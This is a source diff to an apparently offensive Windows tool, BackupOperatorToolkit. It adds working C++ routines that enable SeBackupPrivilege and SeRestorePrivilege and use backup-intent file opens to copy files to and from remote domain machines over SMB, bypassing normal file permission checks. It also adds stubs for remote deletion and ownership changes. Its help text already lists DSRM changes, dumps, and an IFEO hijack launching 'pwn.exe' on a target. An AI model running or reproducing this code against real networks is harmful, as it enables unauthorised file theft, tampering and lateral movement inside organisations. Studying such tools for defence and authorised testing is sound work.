@@ -46,6 +46,102 @@ static std::string FormatErrorMessage(DWORD errorCode) {
 	return message;
 }
 
+static std::wstring ConvertToWide(const char* value) {
+	if (value == NULL) {
+		return std::wstring();
+	}
+
+	int required = MultiByteToWideChar(CP_ACP, 0, value, -1, nullptr, 0);
+	if (required <= 0) {
+		return std::wstring();
+	}
+
+	std::wstring wide(static_cast<size_t>(required - 1), L'\0');
+	if (!wide.empty()) {
+		int converted = MultiByteToWideChar(CP_ACP, 0, value, -1, &wide[0], required);
+		if (converted == 0) {
+			return std::wstring();
+		}
+	}
+	return wide;
+}
+
+static std::wstring BuildExtendedPath(const std::wstring& path) {
+	if (path.empty()) {
+		return path;
+	}
+
+	if (path.rfind(L"\\\\?\\", 0) == 0) {
+		return path;
+	}
+
+	std::wstring normalized = path;
+	for (auto& ch : normalized) {
+		if (ch == L'/') {
+			ch = L'\\';
+		}
+	}
+
+	if (normalized.rfind(L"\\\\", 0) == 0) {
+		return L"\\\\?\\UNC\\" + normalized.substr(2);
+	}
+
+	DWORD required = GetFullPathNameW(normalized.c_str(), 0, NULL, NULL);
+	if (required == 0) {
+		return normalized;
+	}
+
+	std::wstring buffer(static_cast<size_t>(required) + 1, L'\0');
+	DWORD written = GetFullPathNameW(normalized.c_str(), static_cast<DWORD>(buffer.size()), &buffer[0], NULL);
+	if (written == 0 || written >= static_cast<DWORD>(buffer.size())) {
+		return normalized;
+	}
+
+	buffer.resize(static_cast<size_t>(written));
+	return L"\\\\?\\" + buffer;
+}
+
+static bool EnablePrivilege(LPCWSTR privilegeName) {
+	HANDLE token = NULL;
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] OpenProcessToken failed: %lu - %s\n", error, message.c_str());
+		return false;
+	}
+
+	LUID luid = {};
+	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] LookupPrivilegeValueW failed: %lu - %s\n", error, message.c_str());
+		CloseHandle(token);
+		return false;
+	}
+
+	TOKEN_PRIVILEGES privileges = {};
+	privileges.PrivilegeCount = 1;
+	privileges.Privileges[0].Luid = luid;
+	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	if (!AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), NULL, NULL)) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] AdjustTokenPrivileges failed: %lu - %s\n", error, message.c_str());
+		CloseHandle(token);
+		return false;
+	}
+
+	DWORD adjustError = GetLastError();
+	CloseHandle(token);
+	if (adjustError == ERROR_NOT_ALL_ASSIGNED) {
+		printf("[-] Required privilege is not assigned\n");
+		return false;
+	}
+
+	return true;
+}
+
 static std::string NormalizeTargetName(LPCSTR machine) {
 	if (machine == NULL) {
 		return "";
@@ -86,6 +182,10 @@ void help(){
 	printf("Usage: BackupOperatorToolkit.exe DSRM \\\\TARGET.DOMAIN.DK 0||1||2\n");
 	printf("Usage: BackupOperatorToolkit.exe DUMP \\\\PATH\\To\\Dump \\\\TARGET.DOMAIN.DK [!] If the dump path is local, the dump will be on the remote computer \n");
 	printf("Usage: BackupOperatorToolkit.exe IFEO notepad.exe \\\\Path\\To\\pwn.exe \\\\TARGET.DOMAIN.DK \n");
+	printf("Usage: BackupOperatorToolkit.exe COPYREMOTE C:\\LocalPath\\File.txt \\\\TARGET.DOMAIN.COM\\c$\\temp\\");
+	printf("Usage: BackupOperatorToolkit.exe COPYLOCAL C:\\LocalPath\\ \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
+	printf("Usage: BackupOperatorToolkit.exe DELREMOTE \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
+	printf("Usage: BackupOperatorToolkit.exe OWNREMOTE CORP1\\stdusr \\\\TARGET.DOMAIN.COM\\c$\\temp\\file.txt");
 }
 
 void service(){
@@ -339,6 +439,423 @@ void ifeo() {
 
 }
 
+void copyremote(){
+	const char* localPath = servicepath;
+	const char* remotePath = target;
+
+	if (behaviour && behaviour[0] != '\0') {
+		localPath = behaviour;
+	}
+	if ((remotePath == NULL || remotePath[0] == '\0') && dumppath && dumppath[0] != '\0') {
+		remotePath = dumppath;
+	}
+
+	if (localPath == NULL || localPath[0] == '\0') {
+		printf("[-] Local file path is missing.\n");
+		return;
+	}
+
+	if (remotePath == NULL || remotePath[0] == '\0') {
+		printf("[-] Remote file path is missing.\n");
+		return;
+	}
+
+	if (!EnablePrivilege(SE_BACKUP_NAME)) {
+		printf("[-] Unable to enable SeBackupPrivilege.\n");
+		return;
+	}
+
+	if (!EnablePrivilege(SE_RESTORE_NAME)) {
+		printf("[-] Unable to enable SeRestorePrivilege.\n");
+		return;
+	}
+
+	std::wstring localPathW = ConvertToWide(localPath);
+	if (localPathW.empty()) {
+		printf("[-] Failed to convert local path to wide string.\n");
+		return;
+	}
+
+	std::wstring remotePathW = ConvertToWide(remotePath);
+	if (remotePathW.empty()) {
+		printf("[-] Failed to convert remote path to wide string.\n");
+		return;
+	}
+
+	std::wstring extendedLocalPath = BuildExtendedPath(localPathW);
+	std::wstring extendedRemotePath = BuildExtendedPath(remotePathW);
+
+	HANDLE localFile = CreateFileW(
+		extendedLocalPath.c_str(),
+		GENERIC_READ,
+		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS,
+		NULL);
+	if (localFile == INVALID_HANDLE_VALUE) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] CreateFileW (local: %s) failed: %lu - %s\n", localPath, error, message.c_str());
+		return;
+	}
+
+	HANDLE remoteFile = CreateFileW(
+		extendedRemotePath.c_str(),
+		GENERIC_WRITE,
+		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+		NULL,
+		CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS,
+		NULL);
+	if (remoteFile == INVALID_HANDLE_VALUE) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] CreateFileW (remote: %s) failed: %lu - %s\n", remotePath, error, message.c_str());
+		CloseHandle(localFile);
+		return;
+	}
+
+	BYTE buffer[1 << 16];
+	DWORD bytesRead = 0;
+	DWORD bytesWritten = 0;
+	bool success = true;
+
+	while (true) {
+		if (!ReadFile(localFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
+			DWORD error = GetLastError();
+			std::string message = FormatErrorMessage(error);
+			printf("[-] ReadFile failed: %lu - %s\n", error, message.c_str());
+			success = false;
+			break;
+		}
+
+		if (bytesRead == 0) {
+			break;
+		}
+
+		if (!WriteFile(remoteFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
+			DWORD error = GetLastError();
+			std::string message = FormatErrorMessage(error);
+			printf("[-] WriteFile failed: %lu - %s\n", error, message.c_str());
+			success = false;
+			break;
+		}
+	}
+
+	if (success) {
+		if (!FlushFileBuffers(remoteFile)) {
+			DWORD error = GetLastError();
+			std::string message = FormatErrorMessage(error);
+			printf("[!] FlushFileBuffers reported an error: %lu - %s\n", error, message.c_str());
+		}
+		else {
+			printf("[+] Copied %s to %s using SeRestorePrivilege.\n", localPath, remotePath);
+		}
+	}
+
+	CloseHandle(remoteFile);
+	CloseHandle(localFile);
+}
+
+void copylocal(){
+	const char* localPath = servicepath;
+	const char* remotePath = target;
+
+	if ((remotePath == NULL || remotePath[0] == '\0') && behaviour && behaviour[0] != '\0') {
+		remotePath = behaviour;
+	}
+	if ((localPath == NULL || localPath[0] == '\0') && dumppath && dumppath[0] != '\0') {
+		localPath = dumppath;
+	}
+
+	if (remotePath == NULL || remotePath[0] == '\0') {
+		printf("[-] Remote file path is missing.\n");
+		return;
+	}
+
+	if (localPath == NULL || localPath[0] == '\0') {
+		printf("[-] Local file path is missing.\n");
+		return;
+	}
+
+	if (!EnablePrivilege(SE_BACKUP_NAME)) {
+		printf("[-] Unable to enable SeBackupPrivilege.\n");
+		return;
+	}
+
+	std::wstring remotePathW = ConvertToWide(remotePath);
+	if (remotePathW.empty()) {
+		printf("[-] Failed to convert remote path to wide string.\n");
+		return;
+	}
+
+	std::wstring localPathW = ConvertToWide(localPath);
+	if (localPathW.empty()) {
+		printf("[-] Failed to convert local path to wide string.\n");
+		return;
+	}
+
+	std::wstring extendedRemotePath = BuildExtendedPath(remotePathW);
+	std::wstring extendedLocalPath = BuildExtendedPath(localPathW);
+
+	auto buildNtPath = [](const std::wstring& extended) -> std::wstring {
+		if (extended.empty()) {
+			return std::wstring();
+		}
+		if (extended.rfind(L"\\\\?\\UNC\\", 0) == 0) {
+			return L"\\??\\UNC\\" + extended.substr(8);
+		}
+		if (extended.rfind(L"\\\\?\\", 0) == 0) {
+			return L"\\??\\" + extended.substr(4);
+		}
+		if (extended.rfind(L"\\\\", 0) == 0) {
+			return L"\\??\\UNC\\" + extended.substr(2);
+		}
+		return L"\\??\\" + extended;
+	};
+
+	std::wstring remoteNtPath = buildNtPath(extendedRemotePath);
+	if (remoteNtPath.empty()) {
+		printf("[-] Failed to build NT path for remote file.\n");
+		return;
+	}
+
+	std::wstring localNtPath = buildNtPath(extendedLocalPath);
+	if (localNtPath.empty()) {
+		printf("[-] Failed to build NT path for local file.\n");
+		return;
+	}
+
+	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+	if (ntdll == NULL) {
+		ntdll = LoadLibraryW(L"ntdll.dll");
+	}
+	if (ntdll == NULL) {
+		DWORD error = GetLastError();
+		std::string message = FormatErrorMessage(error);
+		printf("[-] Failed to load ntdll.dll: %lu - %s\n", error, message.c_str());
+		return;
+	}
+
+#ifndef NTSTATUS
+	typedef LONG NTSTATUS;
+#endif
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+#ifndef OBJ_CASE_INSENSITIVE
+#define OBJ_CASE_INSENSITIVE 0x00000040
+#endif
+#ifndef FILE_OPEN_FOR_BACKUP_INTENT
+#define FILE_OPEN_FOR_BACKUP_INTENT 0x00004000
+#endif
+#ifndef FILE_SYNCHRONOUS_IO_NONALERT
+#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
+#endif
+#ifndef FILE_NON_DIRECTORY_FILE
+#define FILE_NON_DIRECTORY_FILE 0x00000040
+#endif
+#ifndef FILE_OPEN
+#define FILE_OPEN 0x00000001
+#endif
+#ifndef FILE_OVERWRITE_IF
+#define FILE_OVERWRITE_IF 0x00000005
+#endif
+
+	typedef struct _UNICODE_STRING_LOCAL {
+		USHORT Length;
+		USHORT MaximumLength;
+		PWSTR Buffer;
+	} UNICODE_STRING_LOCAL, *PUNICODE_STRING_LOCAL;
+
+	typedef struct _OBJECT_ATTRIBUTES_LOCAL {
+		ULONG Length;
+		HANDLE RootDirectory;
+		PUNICODE_STRING_LOCAL ObjectName;
+		ULONG Attributes;
+		PVOID SecurityDescriptor;
+		PVOID SecurityQualityOfService;
+	} OBJECT_ATTRIBUTES_LOCAL, *POBJECT_ATTRIBUTES_LOCAL;
+
+	typedef struct _IO_STATUS_BLOCK_LOCAL {
+		union {
+			NTSTATUS Status;
+			PVOID Pointer;
+		};
+		ULONG_PTR Information;
+	} IO_STATUS_BLOCK_LOCAL, *PIO_STATUS_BLOCK_LOCAL;
+
+	typedef NTSTATUS(NTAPI* NtCreateFile_t)(
+		PHANDLE,
+		ACCESS_MASK,
+		POBJECT_ATTRIBUTES_LOCAL,
+		PIO_STATUS_BLOCK_LOCAL,
+		PLARGE_INTEGER,
+		ULONG,
+		ULONG,
+		ULONG,
+		ULONG,
+		PVOID,
+		ULONG);
+
+	typedef ULONG(NTAPI* RtlNtStatusToDosError_t)(NTSTATUS);
+
+	NtCreateFile_t NtCreateFilePtr = reinterpret_cast<NtCreateFile_t>(GetProcAddress(ntdll, "NtCreateFile"));
+	RtlNtStatusToDosError_t RtlNtStatusToDosErrorPtr = reinterpret_cast<RtlNtStatusToDosError_t>(GetProcAddress(ntdll, "RtlNtStatusToDosError"));
+
+	if (NtCreateFilePtr == NULL) {
+		printf("[-] NtCreateFile is not available.\n");
+		return;
+	}
+
+	auto formatStatus = [&](NTSTATUS status) -> std::string {
+		if (RtlNtStatusToDosErrorPtr) {
+			DWORD winError = RtlNtStatusToDosErrorPtr(status);
+			if (winError != 0) {
+				return FormatErrorMessage(winError);
+			}
+		}
+		char buffer[32];
+		snprintf(buffer, sizeof(buffer), "NTSTATUS 0x%08lx", static_cast<long>(status));
+		return std::string(buffer);
+	};
+
+	auto initUnicodeString = [](UNICODE_STRING_LOCAL& ustr, const std::wstring& value) {
+		size_t byteLength = value.size() * sizeof(wchar_t);
+		if (byteLength > 0xFFFF) {
+			ustr.Length = 0;
+			ustr.MaximumLength = 0;
+			ustr.Buffer = nullptr;
+			return false;
+		}
+		ustr.Length = static_cast<USHORT>(byteLength);
+		ustr.MaximumLength = static_cast<USHORT>(byteLength);
+		ustr.Buffer = const_cast<PWSTR>(value.c_str());
+		return true;
+	};
+
+	auto initObjectAttributes = [](OBJECT_ATTRIBUTES_LOCAL& attrs, UNICODE_STRING_LOCAL& name) {
+		attrs.Length = sizeof(OBJECT_ATTRIBUTES_LOCAL);
+		attrs.RootDirectory = NULL;
+		attrs.ObjectName = &name;
+		attrs.Attributes = OBJ_CASE_INSENSITIVE;
+		attrs.SecurityDescriptor = NULL;
+		attrs.SecurityQualityOfService = NULL;
+	};
+
+	UNICODE_STRING_LOCAL remoteName = {};
+	if (!initUnicodeString(remoteName, remoteNtPath)) {
+		printf("[-] Remote NT path is too long.\n");
+		return;
+	}
+
+	UNICODE_STRING_LOCAL localName = {};
+	if (!initUnicodeString(localName, localNtPath)) {
+		printf("[-] Local NT path is too long.\n");
+		return;
+	}
+
+	OBJECT_ATTRIBUTES_LOCAL remoteAttributes = {};
+	initObjectAttributes(remoteAttributes, remoteName);
+
+	OBJECT_ATTRIBUTES_LOCAL localAttributes = {};
+	initObjectAttributes(localAttributes, localName);
+
+	IO_STATUS_BLOCK_LOCAL remoteStatus = {};
+	IO_STATUS_BLOCK_LOCAL localStatus = {};
+
+	HANDLE remoteHandle = NULL;
+	NTSTATUS status = NtCreateFilePtr(
+		&remoteHandle,
+		GENERIC_READ | SYNCHRONIZE,
+		&remoteAttributes,
+		&remoteStatus,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+		FILE_OPEN,
+		FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+		NULL,
+		0);
+	if (!NT_SUCCESS(status)) {
+		std::string message = formatStatus(status);
+		printf("[-] NtCreateFile (remote: %s) failed: %s\n", remotePath, message.c_str());
+		return;
+	}
+
+	HANDLE localHandle = NULL;
+	status = NtCreateFilePtr(
+		&localHandle,
+		GENERIC_WRITE | SYNCHRONIZE,
+		&localAttributes,
+		&localStatus,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_READ,
+		FILE_OVERWRITE_IF,
+		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
+		NULL,
+		0);
+	if (!NT_SUCCESS(status)) {
+		std::string message = formatStatus(status);
+		printf("[-] NtCreateFile (local: %s) failed: %s\n", localPath, message.c_str());
+		CloseHandle(remoteHandle);
+		return;
+	}
+
+	BYTE buffer[1 << 16];
+	DWORD bytesRead = 0;
+	DWORD bytesWritten = 0;
+	bool success = true;
+
+	while (true) {
+		if (!ReadFile(remoteHandle, buffer, sizeof(buffer), &bytesRead, NULL)) {
+			DWORD error = GetLastError();
+			std::string message = FormatErrorMessage(error);
+			printf("[-] ReadFile failed: %lu - %s\n", error, message.c_str());
+			success = false;
+			break;
+		}
+
+		if (bytesRead == 0) {
+			break;
+		}
+
+		if (!WriteFile(localHandle, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead) {
+			DWORD error = GetLastError();
+			std::string message = FormatErrorMessage(error);
+			printf("[-] WriteFile failed: %lu - %s\n", error, message.c_str());
+			success = false;
+			break;
+		}
+	}
+
+	if (success) {
+		if (!FlushFileBuffers(localHandle)) {
+			DWORD error = GetLastError();
+			std::string message = FormatErrorMessage(error);
+			printf("[!] FlushFileBuffers reported an error: %lu - %s\n", error, message.c_str());
+		}
+		else {
+			printf("[+] Copied %s to %s using SeBackupPrivilege.\n", remotePath, localPath);
+		}
+	}
+
+	CloseHandle(localHandle);
+	CloseHandle(remoteHandle);
+}
+
+void delremote(){
+	// TODO: Delete a remote file over SMB on the remote computer using File_open_for_backup_intent flag in the SMB protocol as explained in https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e8fb45c1-a03d-44ca-b7ae-47385cfd7997  The goal here is to write(delete) the file using SeRestorePrivilege instead of relying on standard dacl checks.
+
+}
+
+void ownremote(){
+	// TODO: Change the Owner in the security descriptor of a remote file over SMB on the remote computer using File_open_for_backup_intent in the SMB protocol as explained in https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e8fb45c1-a03d-44ca-b7ae-47385cfd7997  The goal here is to write to the file's security descriptor using SeRestorePrivilege instead of relying on standard dacl checks without otherwise altering the contents of the file.
+
+}
+
 int main(int argc, LPCSTR argv[])
 {
 	if (argc < 2) {
@@ -389,6 +906,26 @@ int main(int argc, LPCSTR argv[])
 		ifeoservicepath = argv[3];
 		target = argv[4];
 		ifeo();
+	}
+	else if (strcmp(mode, "COPYLOCAL") == 0) {
+		if (argc < 4) {
+			help();
+			return 0;
+		}
+		printf("COPYLOCAL MODE\n");
+		servicepath = argv[2];
+		target = argv[3];
+		copylocal();
+	}
+	else if (strcmp(mode, "COPYREMOTE") == 0) {
+		if (argc < 4) {
+			help();
+			return 0;
+		}
+		printf("COPYREMOTE MODE\n");
+		servicepath = argv[2];
+		target = argv[3];
+		copyremote();
 	}
 
 	else {
